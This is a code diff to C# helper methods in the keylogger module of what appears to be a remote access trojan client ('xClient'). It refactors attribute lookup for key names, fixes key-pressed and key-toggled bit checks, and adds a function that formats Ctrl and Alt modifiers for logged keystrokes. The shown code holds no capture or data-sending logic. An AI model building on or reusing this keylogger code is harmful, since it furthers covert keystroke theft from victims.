@@ -33,11 +33,21 @@ namespace xClient.Core.Keylogger
         {
             try
             {
-                KeyloggerKey keyInformation = ((KeyloggerKey)sender.GetType().GetCustomAttributes(typeof(KeyloggerKeys), false)[0]);
+                FieldInfo fieldInfo = sender.GetType().GetField(sender.ToString());
 
-                return keyInformation.IsSpecialKey;
+                if (fieldInfo != null)
+                {
+                    KeyloggerKey[] keyloggerKeyAttributes = fieldInfo.GetCustomAttributes(typeof(KeyloggerKey), false) as KeyloggerKey[];
+
+                    if (keyloggerKeyAttributes != null && keyloggerKeyAttributes.Length > 0)
+                    {
+                        return keyloggerKeyAttributes[0].IsSpecialKey;
+                    }
+                }
+
+                return false;
             }
-            catch (TypeLoadException)
+            catch
             {
                 // The likely cause of this exception would be a lack of an attribute for the Keylogger Key.
                 return false;
@@ -48,16 +58,27 @@ namespace xClient.Core.Keylogger
         /// Obtains the name, if one was given, of the key provided.
         /// </summary>
         /// <param name="sender">The keylogger key to obtain the name from.</param>
-        /// <returns>Returns the name of the key that was explicitly provided.</returns>
+        /// <returns>Returns the name of the key that was explicitly provided, or string.Empty
+        ///          if none was provided.</returns>
         public static string GetKeyloggerKeyName(this KeyloggerKeys sender)
         {
             try
             {
-                KeyloggerKey keyInformation = ((KeyloggerKey)sender.GetType().GetCustomAttributes(typeof(KeyloggerKeys), false)[0]);
+                FieldInfo fieldInfo = sender.GetType().GetField(sender.ToString());
 
-                return keyInformation.KeyName;
+                if (fieldInfo != null)
+                {
+                    KeyloggerKey[] keyloggerKeyAttributes = fieldInfo.GetCustomAttributes(typeof(KeyloggerKey), false) as KeyloggerKey[];
+
+                    if (keyloggerKeyAttributes != null && keyloggerKeyAttributes.Length > 0)
+                    {
+                        return keyloggerKeyAttributes[0].KeyName;
+                    }
+                }
+
+                return string.Empty;
             }
-            catch (TypeLoadException)
+            catch
             {
                 // The likely cause of this exception would be a lack of an attribute for the Keylogger Key.
                 return string.Empty;
@@ -71,7 +92,7 @@ namespace xClient.Core.Keylogger
         /// <returns>True if key is pressed; False if the key is not.</returns>
         public static bool IsKeyPressed(this short sender)
         {
-            return Convert.ToBoolean(sender & 0x8000);
+            return (sender & 0x8000) == 0x8000;
         }
 
         /// <summary>
@@ -81,7 +102,38 @@ namespace xClient.Core.Keylogger
         /// <returns>True if toggled on; False if toggled off.</returns>
         public static bool IsKeyToggled(this short sender)
         {
-            return ((sender & 0xffff) != 0);
+            return (sender & 0xffff) == 0xffff;
+        }
+
+        public static string BuildString(this KeyloggerModifierKeys sender)
+        {
+            // Add to this method for more combinations that should be supported!
+
+            try
+            {
+                StringBuilder BuiltModifierKeys = new StringBuilder();
+
+                if (sender.CtrlKeyPressed)
+                {
+                    string CtrlName = KeyloggerKeys.VK_CONTROL.GetKeyloggerKeyName();
+
+                    if (!string.IsNullOrEmpty(CtrlName))
+                        BuiltModifierKeys.Append(CtrlName + " +");
+                }
+                if (sender.AltKeyPressed)
+                {
+                    string AltName = KeyloggerKeys.VK_MENU.GetKeyloggerKeyName();
+
+                    if (!string.IsNullOrEmpty(AltName))
+                        BuiltModifierKeys.Append(" " + AltName + " +");
+                }
+
+                return BuiltModifierKeys.ToString();
+            }
+            catch
+            {
+                return string.Empty;
+            }
         }
     }
 }
